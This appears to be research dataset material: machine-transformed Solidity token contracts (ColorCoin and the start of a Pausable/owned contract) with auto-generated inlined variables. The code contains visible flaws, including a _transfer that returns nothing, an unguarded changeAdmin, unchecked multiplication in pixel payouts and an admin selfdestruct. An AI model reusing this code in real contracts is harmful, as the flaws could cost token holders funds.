        if (!(who == founder || who == admin)) {
            revert();
        }
        admin = who;
    }

    function getAdmin() public view returns (address) {
        if (!(msg.sender == founder || msg.sender == admin)) {
            revert();
        }
        return admin;
    }

    function totalSupply() public view returns (uint256) {
        return __totalSupply;
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return accounts[_owner];
    }

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
        if (!(_to != address(0x0))) {
            revert();
        }
        if (!(_value <= accounts[_from])) {
            revert();
        }
        accounts[_to] = accounts[_to].add(_value);
        accounts[_from] = accounts[_from].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        bool _Base20__transfer_TMP_52_0_0;
        {
            {
                if (!(_to != address(0x0))) {
                    revert();
                }
                if (!(_value <= accounts[msg.sender])) {
                    revert();
                }
                accounts[_to] = accounts[_to].add(_value);
                accounts[msg.sender] = accounts[msg.sender].sub(_value);
                emit Transfer(msg.sender, _to, _value);
                _Base20__transfer_TMP_52_0_0 = true;
            }
        }
        return _Base20__transfer_TMP_52_0_0;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        if (!(_value <= allowed[_from][msg.sender])) {
            revert();
        }
        bool _Base20__transfer_TMP_56_0_0;
        {
            {
                if (!(_to != address(0x0))) {
                    revert();
                }
                if (!(_value <= accounts[_from])) {
                    revert();
                }
                accounts[_to] = accounts[_to].add(_value);
                accounts[_from] = accounts[_from].sub(_value);
                emit Transfer(_from, _to, _value);
                _Base20__transfer_TMP_56_0_0 = true;
            }
        }

        allowed[_from][msg.sender] -= _value;
        emit Approval(_from, msg.sender, allowed[_from][msg.sender]);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
}

contract _Suspendable is _Base20 {
    event AutoGenerated_mapping__Suspendable(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    bool internal isTransferable = false;
    mapping(address => bool) internal suspendedAddresses;

    constructor(uint256 _totalSupply, address payable _founder, address _admin) public _Base20(_totalSupply, _founder, _admin) {}

    modifier transferable() {
        if (!(isTransferable || msg.sender == founder)) {
            revert();
        }
        _;
    }

    function isTransferEnabled() public view returns (bool) {
        return isTransferable;
    }

    function enableTransfer() public onlyAdmin {
        if (!(admin == msg.sender)) {
            revert();
        }
        isTransferable = true;
    }

    function disableTransfer() public onlyAdmin {
        if (!(admin == msg.sender)) {
            revert();
        }
        isTransferable = false;
    }

    function isSuspended(address _address) public view returns (bool) {
        return suspendedAddresses[_address];
    }

    function suspend(address who) public onlyAdmin {
        if (!(admin == msg.sender)) {
            revert();
        }
        if (who == founder || who == admin) {
            return;
        }
        suspendedAddresses[who] = true;
    }

    function unsuspend(address who) public onlyAdmin {
        if (!(admin == msg.sender)) {
            revert();
        }
        suspendedAddresses[who] = false;
    }

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
        bool _Suspendable_isSuspended_TMP_122_0_0;
        {
            {
                _Suspendable_isSuspended_TMP_122_0_0 = suspendedAddresses[_to];
            }
        }
        if (!(!_Suspendable_isSuspended_TMP_122_0_0)) {
            revert();
        }
        bool _Suspendable_isSuspended_TMP_126_1_0;
        {
            {
                _Suspendable_isSuspended_TMP_126_1_0 = suspendedAddresses[_from];
            }
        }
        if (!(!_Suspendable_isSuspended_TMP_126_1_0)) {
            revert();
        }
        bool _Suspendable__transfer_TMP_130_0_0;
        {
            {
                if (!(_to != address(0x0))) {
                    revert();
                }
                if (!(_value <= accounts[_from])) {
                    revert();
                }
                accounts[_to] = accounts[_to].add(_value);
                accounts[_from] = accounts[_from].sub(_value);
                emit Transfer(_from, _to, _value);
                _Suspendable__transfer_TMP_130_0_0 = true;
            }
        }
        return _Suspendable__transfer_TMP_130_0_0;
    }

    function transfer(address _to, uint256 _value) public transferable returns (bool) {
        if (!(isTransferable || msg.sender == founder)) {
            revert();
        }
        bool _Suspendable__transfer_TMP_135_0_0;
        {
            {
                bool _Suspendable_isSuspended_TMP_178_0_1;
                {
                    {
                        _Suspendable_isSuspended_TMP_178_0_1 = suspendedAddresses[_to];
                    }
                }
                if (!(!_Suspendable_isSuspended_TMP_178_0_1)) {
                    revert();
                }
                bool _Suspendable_isSuspended_TMP_182_1_1;
                {
                    {
                        _Suspendable_isSuspended_TMP_182_1_1 = suspendedAddresses[msg.sender];
                    }
                }
                if (!(!_Suspendable_isSuspended_TMP_182_1_1)) {
                    revert();
                }
                bool _Suspendable__transfer_TMP_186_0_1;
                {
                    {
                        if (!(_to != address(0x0))) {
                            revert();
                        }
                        if (!(_value <= accounts[msg.sender])) {
                            revert();
                        }
                        accounts[_to] = accounts[_to].add(_value);
                        accounts[msg.sender] = accounts[msg.sender].sub(_value);
                        emit Transfer(msg.sender, _to, _value);
                        _Suspendable__transfer_TMP_186_0_1 = true;
                    }
                }
                _Suspendable__transfer_TMP_135_0_0 = _Suspendable__transfer_TMP_186_0_1;
            }
        }
        return _Suspendable__transfer_TMP_135_0_0;
    }

    function transferFrom(address _from, address _to, uint256 _value) public transferable returns (bool) {
        if (!(isTransferable || msg.sender == founder)) {
            revert();
        }
        bool _Suspendable_isSuspended_TMP_141_0_0;
        {
            {
                _Suspendable_isSuspended_TMP_141_0_0 = suspendedAddresses[msg.sender];
            }
        }
        if (!(!_Suspendable_isSuspended_TMP_141_0_0)) {
            revert();
        }
        bool _Suspendable_transferFrom_TMP_145_0_0;
        {
            {
                if (!(_value <= allowed[_from][msg.sender])) {
                    revert();
                }
                bool _Suspendable__transfer_TMP_198_0_1;
                {
                    {
                        bool _Suspendable__transfer_3__Suspendable_isSuspended_TMP_122_0_0_0_1;
                        {
                            {
                                _Suspendable__transfer_3__Suspendable_isSuspended_TMP_122_0_0_0_1 = suspendedAddresses[_to];
                            }
                        }
                        if (!(!_Suspendable__transfer_3__Suspendable_isSuspended_TMP_122_0_0_0_1)) {
                            revert();
                        }
                        bool _Suspendable__transfer_3__Suspendable_isSuspended_TMP_126_1_0_0_1;
                        {
                            {
                                _Suspendable__transfer_3__Suspendable_isSuspended_TMP_126_1_0_0_1 = suspendedAddresses[_from];
                            }
                        }
                        if (!(!_Suspendable__transfer_3__Suspendable_isSuspended_TMP_126_1_0_0_1)) {
                            revert();
                        }
                        bool _Suspendable__transfer_3__Suspendable__transfer_TMP_130_0_0_0_1;
                        {
                            {
                                if (!(_to != address(0x0))) {
                                    revert();
                                }
                                if (!(_value <= accounts[_from])) {
                                    revert();
                                }
                                accounts[_to] = accounts[_to].add(_value);
                                accounts[_from] = accounts[_from].sub(_value);
                                emit Transfer(_from, _to, _value);
                                _Suspendable__transfer_3__Suspendable__transfer_TMP_130_0_0_0_1 = true;
                            }
                        }
                        _Suspendable__transfer_TMP_198_0_1 = _Suspendable__transfer_3__Suspendable__transfer_TMP_130_0_0_0_1;
                    }
                }

                allowed[_from][msg.sender] -= _value;
                emit Approval(_from, msg.sender, allowed[_from][msg.sender]);
                _Suspendable_transferFrom_TMP_145_0_0 = true;
            }
        }
        return _Suspendable_transferFrom_TMP_145_0_0;
    }

    function approve(address _spender, uint256 _value) public transferable returns (bool) {
        if (!(isTransferable || msg.sender == founder)) {
            revert();
        }
        bool _Suspendable_isSuspended_TMP_151_0_0;
        {
            {
                _Suspendable_isSuspended_TMP_151_0_0 = suspendedAddresses[msg.sender];
            }
        }
        if (!(!_Suspendable_isSuspended_TMP_151_0_0)) {
            revert();
        }
        bool _Suspendable_approve_TMP_155_0_0;
        {
            {
                allowed[msg.sender][_spender] = _value;
                emit Approval(msg.sender, _spender, _value);
                _Suspendable_approve_TMP_155_0_0 = true;
            }
        }
        return _Suspendable_approve_TMP_155_0_0;
    }

    function changeFounder(address payable who) public onlyFounder {
        if (!(founder == msg.sender)) {
            revert();
        }
        bool _Suspendable_isSuspended_TMP_160_0_0;
        {
            {
                _Suspendable_isSuspended_TMP_160_0_0 = suspendedAddresses[who];
            }
        }
        if (!(!_Suspendable_isSuspended_TMP_160_0_0)) {
            revert();
        }
        {
            if (!(founder == msg.sender)) {
                revert();
            }
            founder = who;
        }
    }

    function changeAdmin(address who) public {
        bool _Suspendable_isSuspended_TMP_166_0_0;
        {
            {
                _Suspendable_isSuspended_TMP_166_0_0 = suspendedAddresses[who];
            }
        }
        if (!(!_Suspendable_isSuspended_TMP_166_0_0)) {
            revert();
        }
        {
            if (!(who == founder || who == admin)) {
                revert();
            }
            admin = who;
        }
    }
}

contract ColorCoinBase is _Suspendable {
    event AutoGenerated_mapping_ColorCoinBase(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    struct LockUp {
        uint256 unlockDate;
        uint256 amount;
    }
    struct Investor {
        uint256 initialAmount;
        uint256 lockedAmount;
        uint256 currentLockUpPeriod;
        LockUp[] lockUpPeriods;
    }
    struct AdminTransfer {
        address from;
        address to;
        uint256 amount;
        string reason;
    }
    event Unlock(address who, uint256 period, uint256 amount);
    event SuperAction(address from, address to, uint256 requestedAmount, uint256 returnedAmount, string reason);
    mapping(address => Investor) internal investors;
    uint256 internal totalLocked;
    AdminTransfer[] internal adminTransferLog;

    constructor(uint256 _totalSupply, address payable _founder, address _admin) public _Suspendable(_totalSupply, _founder, _admin) {}

    function balanceOf(address _owner) public view returns (uint256) {
        return accounts[_owner] + investors[_owner].lockedAmount;
    }

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool) {
        bool ColorCoinBase_hasLockup_TMP_289_0_0;
        {
            {
                ColorCoinBase_hasLockup_TMP_289_0_0 = (investors[_from].lockedAmount > 0);
            }
        }
        if (ColorCoinBase_hasLockup_TMP_289_0_0) {
            {
                bool ColorCoinBase_hasLockup_TMP_386_0_1;
                {
                    {
                        ColorCoinBase_hasLockup_TMP_386_0_1 = (investors[_from].lockedAmount > 0);
                    }
                }
                if (!ColorCoinBase_hasLockup_TMP_386_0_1) {
                    revert();
                }
                uint256 ColorCoinBase_tryUnlock_1_amount_0_0 = 0;
                uint256 ColorCoinBase_tryUnlock_1_i_0_0;
                uint256 ColorCoinBase_tryUnlock_1_start_0_0 = investors[_from].currentLockUpPeriod;
                uint256 ColorCoinBase_tryUnlock_1_end_0_0 = investors[_from].lockUpPeriods.length;
                for (ColorCoinBase_tryUnlock_1_i_0_0 = ColorCoinBase_tryUnlock_1_start_0_0; ColorCoinBase_tryUnlock_1_i_0_0 < ColorCoinBase_tryUnlock_1_end_0_0; ColorCoinBase_tryUnlock_1_i_0_0++) {
                    if (investors[_from].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].unlockDate <= now) {
                        ColorCoinBase_tryUnlock_1_amount_0_0 += investors[_from].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].amount;
                    } else {
                        break;
                    }
                }
                if (ColorCoinBase_tryUnlock_1_i_0_0 == investors[_from].lockUpPeriods.length) {
                    ColorCoinBase_tryUnlock_1_amount_0_0 = investors[_from].lockedAmount;
                } else if (ColorCoinBase_tryUnlock_1_amount_0_0 > investors[_from].lockedAmount) {
                    ColorCoinBase_tryUnlock_1_amount_0_0 = investors[_from].lockedAmount;
                }
                if (ColorCoinBase_tryUnlock_1_amount_0_0 > 0 || ColorCoinBase_tryUnlock_1_i_0_0 > ColorCoinBase_tryUnlock_1_start_0_0) {
                    investors[_from].lockedAmount = investors[_from].lockedAmount.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
                    investors[_from].currentLockUpPeriod = ColorCoinBase_tryUnlock_1_i_0_0;
                    accounts[_from] = accounts[_from].add(ColorCoinBase_tryUnlock_1_amount_0_0);
                    emit Unlock(_from, ColorCoinBase_tryUnlock_1_i_0_0, ColorCoinBase_tryUnlock_1_amount_0_0);
                    totalLocked = totalLocked.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
                }
            }
        }
        bool ColorCoinBase__transfer_TMP_291_0_0;
        {
            {
                bool ColorCoinBase_isSuspended_TMP_401_0_1;
                {
                    {
                        ColorCoinBase_isSuspended_TMP_401_0_1 = suspendedAddresses[_to];
                    }
                }
                if (!(!ColorCoinBase_isSuspended_TMP_401_0_1)) {
                    revert();
                }
                bool ColorCoinBase_isSuspended_TMP_405_1_1;
                {
                    {
                        ColorCoinBase_isSuspended_TMP_405_1_1 = suspendedAddresses[_from];
                    }
                }
                if (!(!ColorCoinBase_isSuspended_TMP_405_1_1)) {
                    revert();
                }
                bool ColorCoinBase__transfer_TMP_409_0_1;
                {
                    {
                        bool ColorCoinBase__transfer_3__Suspendable_isSuspended_TMP_122_0_0_0_1;
                        {
                            {
                                ColorCoinBase__transfer_3__Suspendable_isSuspended_TMP_122_0_0_0_1 = suspendedAddresses[_to];
                            }
                        }
                        if (!(!ColorCoinBase__transfer_3__Suspendable_isSuspended_TMP_122_0_0_0_1)) {
                            revert();
                        }
                        bool ColorCoinBase__transfer_3__Suspendable_isSuspended_TMP_126_1_0_0_1;
                        {
                            {
                                ColorCoinBase__transfer_3__Suspendable_isSuspended_TMP_126_1_0_0_1 = suspendedAddresses[_from];
                            }
                        }
                        if (!(!ColorCoinBase__transfer_3__Suspendable_isSuspended_TMP_126_1_0_0_1)) {
                            revert();
                        }
                        bool ColorCoinBase__transfer_3__Suspendable__transfer_TMP_130_0_0_0_1;
                        {
                            {
                                if (!(_to != address(0x0))) {
                                    revert();
                                }
                                if (!(_value <= accounts[_from])) {
                                    revert();
                                }
                                accounts[_to] = accounts[_to].add(_value);
                                accounts[_from] = accounts[_from].sub(_value);
                                emit Transfer(_from, _to, _value);
                                ColorCoinBase__transfer_3__Suspendable__transfer_TMP_130_0_0_0_1 = true;
                            }
                        }
                        ColorCoinBase__transfer_TMP_409_0_1 = ColorCoinBase__transfer_3__Suspendable__transfer_TMP_130_0_0_0_1;
                    }
                }
                ColorCoinBase__transfer_TMP_291_0_0 = ColorCoinBase__transfer_TMP_409_0_1;
            }
        }
    }

    function distribute(address _to, uint256 _value, uint256[] memory unlockDates, uint256[] memory amounts) public onlyFounder returns (bool) {
        if (!(founder == msg.sender)) {
            revert();
        }
        uint256 ColorCoinBase_balanceOf_TMP_295_0_0;
        {
            {
                ColorCoinBase_balanceOf_TMP_295_0_0 = accounts[_to] + investors[_to].lockedAmount;
            }
        }
        if (!(ColorCoinBase_balanceOf_TMP_295_0_0 == 0)) {
            revert();
        }
        if (!(_value <= accounts[founder])) {
            revert();
        }
        if (!(unlockDates.length == amounts.length)) {
            revert();
        }
        investors[_to].initialAmount = _value;
        investors[_to].lockedAmount = _value;
        investors[_to].currentLockUpPeriod = 0;
        for (uint256 i = 0; i < unlockDates.length; i++) {
            investors[_to].lockUpPeriods.push(LockUp(unlockDates[i], amounts[i]));
        }
        accounts[founder] -= _value;
        emit Transfer(founder, _to, _value);
        totalLocked = totalLocked.add(_value);
        {
            bool ColorCoinBase_hasLockup_TMP_431_0_1;
            {
                {
                    ColorCoinBase_hasLockup_TMP_431_0_1 = (investors[_to].lockedAmount > 0);
                }
            }
            if (!ColorCoinBase_hasLockup_TMP_431_0_1) {
                revert();
            }
            uint256 ColorCoinBase_tryUnlock_1_amount_0_0 = 0;
            uint256 ColorCoinBase_tryUnlock_1_i_0_0;
            uint256 ColorCoinBase_tryUnlock_1_start_0_0 = investors[_to].currentLockUpPeriod;
            uint256 ColorCoinBase_tryUnlock_1_end_0_0 = investors[_to].lockUpPeriods.length;
            for (ColorCoinBase_tryUnlock_1_i_0_0 = ColorCoinBase_tryUnlock_1_start_0_0; ColorCoinBase_tryUnlock_1_i_0_0 < ColorCoinBase_tryUnlock_1_end_0_0; ColorCoinBase_tryUnlock_1_i_0_0++) {
                if (investors[_to].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].unlockDate <= now) {
                    ColorCoinBase_tryUnlock_1_amount_0_0 += investors[_to].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].amount;
                } else {
                    break;
                }
            }
            if (ColorCoinBase_tryUnlock_1_i_0_0 == investors[_to].lockUpPeriods.length) {
                ColorCoinBase_tryUnlock_1_amount_0_0 = investors[_to].lockedAmount;
            } else if (ColorCoinBase_tryUnlock_1_amount_0_0 > investors[_to].lockedAmount) {
                ColorCoinBase_tryUnlock_1_amount_0_0 = investors[_to].lockedAmount;
            }
            if (ColorCoinBase_tryUnlock_1_amount_0_0 > 0 || ColorCoinBase_tryUnlock_1_i_0_0 > ColorCoinBase_tryUnlock_1_start_0_0) {
                investors[_to].lockedAmount = investors[_to].lockedAmount.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
                investors[_to].currentLockUpPeriod = ColorCoinBase_tryUnlock_1_i_0_0;
                accounts[_to] = accounts[_to].add(ColorCoinBase_tryUnlock_1_amount_0_0);
                emit Unlock(_to, ColorCoinBase_tryUnlock_1_i_0_0, ColorCoinBase_tryUnlock_1_amount_0_0);
                totalLocked = totalLocked.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
            }
        }

        return true;
    }

    function hasLockup(address _address) public view returns (bool) {
        return (investors[_address].lockedAmount > 0);
    }

    function _nextUnlockDate(address who) internal view returns (bool, uint256) {
        bool ColorCoinBase_hasLockup_TMP_316_0_0;
        {
            {
                ColorCoinBase_hasLockup_TMP_316_0_0 = (investors[who].lockedAmount > 0);
            }
        }
        if (!ColorCoinBase_hasLockup_TMP_316_0_0) {
            return (false, 0);
        }
        uint256 i = investors[who].currentLockUpPeriod;
        if (i == investors[who].lockUpPeriods.length) {
            return (true, 0);
        }
        if (now < investors[who].lockUpPeriods[i].unlockDate) {
            return (true, investors[who].lockUpPeriods[i].unlockDate - now);
        } else {
            return (true, 0);
        }
    }

    function nextUnlockDate() public view returns (bool, uint256) {
        return _nextUnlockDate(msg.sender);
    }

    function nextUnlockDate_Admin(address who) public view onlyAdmin returns (bool, uint256) {
        if (!(admin == msg.sender)) {
            revert();
        }
        return _nextUnlockDate(who);
    }

    function doUnlock() public {
        {
            bool ColorCoinBase_hasLockup_TMP_457_0_1;
            {
                {
                    ColorCoinBase_hasLockup_TMP_457_0_1 = (investors[msg.sender].lockedAmount > 0);
                }
            }
            if (!ColorCoinBase_hasLockup_TMP_457_0_1) {
                revert();
            }
            uint256 ColorCoinBase_tryUnlock_1_amount_0_0 = 0;
            uint256 ColorCoinBase_tryUnlock_1_i_0_0;
            uint256 ColorCoinBase_tryUnlock_1_start_0_0 = investors[msg.sender].currentLockUpPeriod;
            uint256 ColorCoinBase_tryUnlock_1_end_0_0 = investors[msg.sender].lockUpPeriods.length;
            for (ColorCoinBase_tryUnlock_1_i_0_0 = ColorCoinBase_tryUnlock_1_start_0_0; ColorCoinBase_tryUnlock_1_i_0_0 < ColorCoinBase_tryUnlock_1_end_0_0; ColorCoinBase_tryUnlock_1_i_0_0++) {
                if (investors[msg.sender].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].unlockDate <= now) {
                    ColorCoinBase_tryUnlock_1_amount_0_0 += investors[msg.sender].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].amount;
                } else {
                    break;
                }
            }
            if (ColorCoinBase_tryUnlock_1_i_0_0 == investors[msg.sender].lockUpPeriods.length) {
                ColorCoinBase_tryUnlock_1_amount_0_0 = investors[msg.sender].lockedAmount;
            } else if (ColorCoinBase_tryUnlock_1_amount_0_0 > investors[msg.sender].lockedAmount) {
                ColorCoinBase_tryUnlock_1_amount_0_0 = investors[msg.sender].lockedAmount;
            }
            if (ColorCoinBase_tryUnlock_1_amount_0_0 > 0 || ColorCoinBase_tryUnlock_1_i_0_0 > ColorCoinBase_tryUnlock_1_start_0_0) {
                investors[msg.sender].lockedAmount = investors[msg.sender].lockedAmount.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
                investors[msg.sender].currentLockUpPeriod = ColorCoinBase_tryUnlock_1_i_0_0;
                accounts[msg.sender] = accounts[msg.sender].add(ColorCoinBase_tryUnlock_1_amount_0_0);
                emit Unlock(msg.sender, ColorCoinBase_tryUnlock_1_i_0_0, ColorCoinBase_tryUnlock_1_amount_0_0);
                totalLocked = totalLocked.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
            }
        }
    }

    function doUnlock_Admin(address who) public onlyAdmin {
        if (!(admin == msg.sender)) {
            revert();
        }
        {
            bool ColorCoinBase_hasLockup_TMP_475_0_1;
            {
                {
                    ColorCoinBase_hasLockup_TMP_475_0_1 = (investors[who].lockedAmount > 0);
                }
            }
            if (!ColorCoinBase_hasLockup_TMP_475_0_1) {
                revert();
            }
            uint256 ColorCoinBase_tryUnlock_1_amount_0_0 = 0;
            uint256 ColorCoinBase_tryUnlock_1_i_0_0;
            uint256 ColorCoinBase_tryUnlock_1_start_0_0 = investors[who].currentLockUpPeriod;
            uint256 ColorCoinBase_tryUnlock_1_end_0_0 = investors[who].lockUpPeriods.length;
            for (ColorCoinBase_tryUnlock_1_i_0_0 = ColorCoinBase_tryUnlock_1_start_0_0; ColorCoinBase_tryUnlock_1_i_0_0 < ColorCoinBase_tryUnlock_1_end_0_0; ColorCoinBase_tryUnlock_1_i_0_0++) {
                if (investors[who].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].unlockDate <= now) {
                    ColorCoinBase_tryUnlock_1_amount_0_0 += investors[who].lockUpPeriods[ColorCoinBase_tryUnlock_1_i_0_0].amount;
                } else {
                    break;
                }
            }
            if (ColorCoinBase_tryUnlock_1_i_0_0 == investors[who].lockUpPeriods.length) {
                ColorCoinBase_tryUnlock_1_amount_0_0 = investors[who].lockedAmount;
            } else if (ColorCoinBase_tryUnlock_1_amount_0_0 > investors[who].lockedAmount) {
                ColorCoinBase_tryUnlock_1_amount_0_0 = investors[who].lockedAmount;
            }
            if (ColorCoinBase_tryUnlock_1_amount_0_0 > 0 || ColorCoinBase_tryUnlock_1_i_0_0 > ColorCoinBase_tryUnlock_1_start_0_0) {
                investors[who].lockedAmount = investors[who].lockedAmount.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
                investors[who].currentLockUpPeriod = ColorCoinBase_tryUnlock_1_i_0_0;
                accounts[who] = accounts[who].add(ColorCoinBase_tryUnlock_1_amount_0_0);
                emit Unlock(who, ColorCoinBase_tryUnlock_1_i_0_0, ColorCoinBase_tryUnlock_1_amount_0_0);
                totalLocked = totalLocked.sub(ColorCoinBase_tryUnlock_1_amount_0_0);
            }
        }
    }

    function getLockedAmount() public view returns (uint256) {
        return investors[msg.sender].lockedAmount;
    }

    function getLockedAmount_Admin(address who) public view onlyAdmin returns (uint256) {
        if (!(admin == msg.sender)) {
            revert();
        }
        return investors[who].lockedAmount;
    }

    function tryUnlock(address _address) internal {
        bool ColorCoinBase_hasLockup_TMP_335_0_0;
        {
            {
                ColorCoinBase_hasLockup_TMP_335_0_0 = (investors[_address].lockedAmount > 0);
            }
        }
        if (!ColorCoinBase_hasLockup_TMP_335_0_0) {
            return;
        }
        uint256 amount = 0;
        uint256 i;
        uint256 start = investors[_address].currentLockUpPeriod;
        uint256 end = investors[_address].lockUpPeriods.length;
        for (i = start; i < end; i++) {
            if (investors[_address].lockUpPeriods[i].unlockDate <= now) {
                amount += investors[_address].lockUpPeriods[i].amount;
            } else {
                break;
            }
        }
        if (i == investors[_address].lockUpPeriods.length) {
            amount = investors[_address].lockedAmount;
        } else if (amount > investors[_address].lockedAmount) {
            amount = investors[_address].lockedAmount;
        }
        if (amount > 0 || i > start) {
            investors[_address].lockedAmount = investors[_address].lockedAmount.sub(amount);
            investors[_address].currentLockUpPeriod = i;
            accounts[_address] = accounts[_address].add(amount);
            emit Unlock(_address, i, amount);
            totalLocked = totalLocked.sub(amount);
        }
    }

    function circulatingSupply() public view returns (uint256) {
        return __totalSupply.sub(accounts[founder]).sub(totalLocked);
    }

    function destroy() public onlyAdmin {
        if (!(admin == msg.sender)) {
            revert();
        }
        selfdestruct(founder);
    }
}

contract ColorCoinWithPixel is ColorCoinBase {
    event AutoGenerated_mapping_ColorCoinWithPixel(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    address internal pixelAccount;
    uint256 internal pixelConvRate;
    modifier pixelOrFounder() {
        if (!(msg.sender == founder || msg.sender == pixelAccount)) {
            revert();
        }
        _;
    }

    function circulatingSupply() public view returns (uint256) {
        uint256 ColorCoinWithPixel_circulatingSupply_TMP_541_0_0;
        {
            {
                ColorCoinWithPixel_circulatingSupply_TMP_541_0_0 = __totalSupply.sub(accounts[founder]).sub(totalLocked);
            }
        }
        uint256 result = ColorCoinWithPixel_circulatingSupply_TMP_541_0_0;
        uint256 ColorCoinWithPixel_balanceOf_TMP_542_0_0;
        {
            {
                ColorCoinWithPixel_balanceOf_TMP_542_0_0 = accounts[pixelAccount] + investors[pixelAccount].lockedAmount;
            }
        }
        return result - ColorCoinWithPixel_balanceOf_TMP_542_0_0;
    }

    constructor(uint256 _totalSupply, address payable _founder, address _admin, uint256 _pixelCoinSupply, address _pixelAccount) public ColorCoinBase(_totalSupply, _founder, _admin) {
        if (!(_pixelAccount != _founder)) {
            revert();
        }
        if (!(_pixelAccount != _admin)) {
            revert();
        }
        pixelAccount = _pixelAccount;
        accounts[pixelAccount] = _pixelCoinSupply;
        accounts[_founder] = accounts[_founder].sub(_pixelCoinSupply);
        emit Transfer(founder, pixelAccount, accounts[pixelAccount]);
    }

    function setPixelConversionRate(uint256 _pixelConvRate) public pixelOrFounder {
        if (!(msg.sender == founder || msg.sender == pixelAccount)) {
            revert();
        }
        pixelConvRate = _pixelConvRate;
    }

    function getPixelConversionRate() public view returns (uint256) {
        return pixelConvRate;
    }

    function sendCoinsForPixels(uint32 pixels, address destination) public pixelOrFounder {
        if (!(msg.sender == founder || msg.sender == pixelAccount)) {
            revert();
        }
        uint256 coins = pixels * pixelConvRate;
        if (coins == 0) {
            return;
        }
        if (!(coins <= accounts[pixelAccount])) {
            revert();
        }
        accounts[destination] = accounts[destination].add(coins);
        accounts[pixelAccount] -= coins;
        emit Transfer(pixelAccount, destination, coins);
    }

    function sendCoinsForPixels_Batch(uint32[] memory pixels, address[] memory destinations) public pixelOrFounder {
        if (!(msg.sender == founder || msg.sender == pixelAccount)) {
            revert();
        }
        if (!(pixels.length == destinations.length)) {
            revert();
        }
        uint256 total = 0;
        for (uint256 i = 0; i < pixels.length; i++) {
            uint256 coins = pixels[i] * pixelConvRate;
            address dst = destinations[i];
            accounts[dst] = accounts[dst].add(coins);
            emit Transfer(pixelAccount, dst, coins);
            total += coins;
        }
        if (!(total <= accounts[pixelAccount])) {
            revert();
        }
        accounts[pixelAccount] -= total;
    }

    function sendCoinsForPixels_Array(uint32 pixels, address[] memory recipients) public pixelOrFounder {
        if (!(msg.sender == founder || msg.sender == pixelAccount)) {
            revert();
        }
        uint256 coins = pixels * pixelConvRate;
        uint256 total = coins * recipients.length;
        if (total == 0) {
            return;
        }
        if (!(total <= accounts[pixelAccount])) {
            revert();
        }
        for (uint256 i; i < recipients.length; i++) {
            address dst = recipients[i];
            accounts[dst] = accounts[dst].add(coins);
            emit Transfer(pixelAccount, dst, coins);
        }
        accounts[pixelAccount] -= total;
    }
}

contract ColorCoin is ColorCoinWithPixel {
    event AutoGenerated_mapping_ColorCoin(string mapping_origin, string mapping_cache);
    using SafeMath for uint256;
    string public constant name = "Color Coin";
    string public constant symbol = "CLR";
    uint8 public constant decimals = 18;

    constructor(uint256 _totalSupply, address payable _founder, address _admin, uint256 _pixelCoinSupply, address _pixelAccount) public ColorCoinWithPixel(_totalSupply, _founder, _admin, _pixelCoinSupply, _pixelAccount) {}
}

```

## RQ1_5b3c7cbe3d9d

文件 `units/program.sol`；SHA256 `a37f0314730741c10f73cfcdd284ae1fbdd844353b3e213b0559507f1ee09b49`；位置按UTF-8字节。

```solidity
pragma solidity ^0.4.21;

library SafeMath {
    event AutoGenerated_mapping_SafeMath(string mapping_origin, string mapping_cache);

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        if (!(c / a == b)) {
            revert();
        }
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        if (!(b <= a)) {
            revert();
        }
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        if (!(c >= a)) {
            revert();
        }
        return c;
    }
}

contract owned {
    event AutoGenerated_mapping_owned(string mapping_origin, string mapping_cache);
    address public owner;

    function owned() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        if (!(msg.sender == owner)) {
            revert();
        }
        _;
    }

    function transferOwnership(address originNewOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        owner = originNewOwner;
    }
}

contract saleOwned is owned {
    event AutoGenerated_mapping_saleOwned(string mapping_origin, string mapping_cache);
    mapping(address => bool) public saleContract;
    modifier onlySaleOwner() {
        if (!(msg.sender == owner || true == saleContract[msg.sender])) {
            revert();
        }
        _;
    }

    function isSaleOwner() public view returns (bool success) {
        if (msg.sender == owner || true == saleContract[msg.sender]) {
            return true;
        }
        return false;
    }

    function addSaleOwner(address saleOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        saleContract[saleOwner] = true;
    }

    function delSaleOwner(address saleOwner) public onlyOwner {
        if (!(msg.sender == owner)) {
            revert();
        }
        saleContract[saleOwner] = false;
    }
}

contract Pausable is saleOwned {
    event AutoGenerated_mapping_Pausable(string mapping_origin, string mapping_cache);
    event Pause();
    event Unpause();
    bool public paused = false;
    modifier whenNotPaused() {
        if (!(false == paused)) {
            revert();
        }
        _;
    }
    modifier whenPaused() {
        if (!(true == paused)) {
            revert();
        }
